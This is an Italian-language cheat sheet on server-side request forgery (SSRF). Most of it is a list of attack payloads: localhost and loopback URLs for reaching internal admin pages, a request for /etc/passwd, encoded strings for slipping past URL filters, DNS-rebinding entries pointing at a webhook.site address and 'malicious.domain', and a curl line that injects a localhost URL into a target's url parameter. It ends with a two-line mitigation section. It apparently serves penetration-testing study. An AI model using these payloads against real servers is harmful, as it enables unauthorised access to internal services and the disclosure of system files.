# SSRF (Server-Side Request Forgery)

### **Obiettivo**
Accedere a risorse interne del server o eseguire richieste verso destinazioni non consentite.

### **Payload di Base**

- **Accesso a risorse locali:**
    ```text
  http://localhost/admin
  http://127.0.0.1:80
  http://0.0.0.0:80
    ```

- **Accesso a file interni:**
    ```text
  http://localhost/etc/passwd
    ```

- **Bypass di Filtri (Encoding):**
    ```text
  http://127.0.0.1:80%2f..
  http://127.0.0.1%2500/etc/passwd
    ```

- **DNS Rebinding:**
    ```text
  http://webhook.site/42c40dc4-22d0-46a1-a364-2732cc60eb32
  http://malicious.domain/admin
    ```

### **Test con cURL**

```bash
curl "http://target-site.com/?url=http://localhost/admin"
```

### **Mitigazione**
- Valida rigorosamente l'input URL con una whitelist di domini consentiti.
- Usa richieste server-side sicure.
